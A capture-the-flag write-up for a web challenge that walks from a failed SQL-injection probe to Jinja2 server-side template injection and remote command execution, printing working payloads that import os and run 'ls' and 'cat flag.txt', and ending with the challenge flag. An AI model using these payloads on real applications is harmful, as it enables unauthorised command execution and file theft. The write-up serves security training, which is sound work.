# antikythera

> Lost in the labyrinthine calculations of planetary motion, I stumbled upon an anomaly. Ancient Greek symbols, not our modern equations, whispered of celestial mechanics. Driven by a scientist's curiosity, I cracked their cryptic code. The unearthed knowledge, a testament to their forgotten ingenuity, fueled the creation of the "Greek Astronomical Calculator." This isn't just a tool for prediction; it's a portal to a bygone era's uncanny understanding of the cosmos
> 
> http://antikythera.martiansonly.net
> 
> Author: bl4ckp4r4d1s3

Solution:

No source file(s) was given. Let's check the challenge site...

![image](1.png)

Oh, displays via iframe, let's grab the link and access that directly instead.

![image](2.png)

Hmm, nothing striking in the source.

Let's try to submit `'` to initiate an error with SQL.

![image](3.png)

![image](4.png)

Oh, it only displayed the single quote back.

How about SSTI focusing on Python since it showed `gunicorn` as the webserver being used...

![image](5.png)

Oh, that worked!

Let's try `{{config.items()}}`

![image](6.png)

Hmm, it's not hidden there. Time to RCE!

Let's display the builtins as a test...`{{ self.__init__.__globals__.__builtins__ }}`

![image](7.png)

Cool, we can use `__import__`, let's list the files via `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}`!

![image](8.png)

There's the target file! Time to read it via `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}`!!

![image](9.png)

Boom!

Flag: `shctf{SSTI_1s_m0r3_fun_!_Wh3n_1t_b3c0m3s_RC3!}`





